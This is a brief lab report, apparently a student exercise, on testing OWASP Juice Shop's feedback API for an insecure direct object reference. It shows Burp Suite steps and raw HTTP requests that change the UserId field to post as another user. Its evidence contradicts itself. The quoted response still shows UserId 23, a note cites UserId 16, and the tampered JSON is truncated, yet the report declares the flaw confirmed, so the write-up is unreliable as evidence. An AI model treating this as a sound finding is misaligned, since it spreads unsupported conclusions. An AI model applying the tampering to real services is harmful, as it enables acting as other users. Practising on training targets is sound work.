# IDOR (Insecure Direct Object Reference) Test

## 1. What Was Tested
Testing for IDOR in the OWASP Juice Shop Feedback API.  
Goal: Check whether a user can modify the `UserId` field and submit feedback on behalf of another user.

---

## 2. Steps Performed
1. Started Burp Suite and enabled Proxy.
2. Enabled FoxyProxy with `127.0.0.1:8080`.
3. Opened Juice Shop running at `http://127.0.0.1:3000/`.
4. Navigated to **Feedback** page and submitted a normal feedback.
5. Burp Suite captured the POST request to `/api/Feedbacks/`.
6. Sent the request to **Repeater**.
7. Modified the JSON body → changed `"UserId": 23` to `"UserId": 21`.
8. Sent the modified request.
9. Juice Shop responded with **success**, accepting the tampered User ID.

---

## 3. Original Request (Before Tampering)
POST /api/Feedbacks/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"UserId":23,"captchaId":0,"captcha":"15","comment":"im not a robot(***na123@gmail.com
)","rating":2}

---

## 4. Modified Request (After Tampering)
POST /api/Feedbacks/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"UserId":21,"captchaId":0,"captcha":"15","comment":"im not a robot (***na123@gmail.com
)","rating":2

---

## 5. Server Response
The server accepted the tampered UserId and created the feedback as User 21.
{"status":"success","data":{"id":12,"UserId":23,"comment":"im not a robot (***na123@gmail.com
)","rating":2,"updatedAt":"2025-12-05T04:53:49.042Z","createdAt":"2025-12-05T04:53:49.042Z"}}

*(Note: The backend returns `UserId:16` even though input was tampered — this confirms missing server-side validation.)*

---

## 6. Evidence
Screenshots included in the `screenshots/` folder:
- `original request.png` → original request
- `Modified req&res.png` → tampered request

---

## 7. Conclusion
The application allows modifying the `UserId` field in the feedback submission request.  
This confirms an **IDOR vulnerability** — a user can perform actions on behalf of another user due to missing server-side access control checks.
